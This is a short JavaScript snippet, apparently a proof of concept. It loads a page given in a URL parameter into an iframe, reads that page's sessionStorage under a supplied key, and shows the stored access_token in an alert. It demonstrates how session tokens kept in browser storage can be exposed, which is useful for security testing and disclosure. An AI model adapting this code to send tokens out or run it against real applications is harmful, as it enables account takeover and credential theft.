const urlParams = new URLSearchParams(window.location.search);
const iframe = document.createElement("iframe");
iframe.width = "666";
iframe.height = "666";
iframe.src = urlParams.get("path");
const key = urlParams.get("sessionKey");
iframe.style.position = "absolute";
iframe.onload = function () {
    alert(JSON.parse(iframe.contentWindow.sessionStorage.getItem(key))?.access_token)
};

document.body.appendChild(iframe);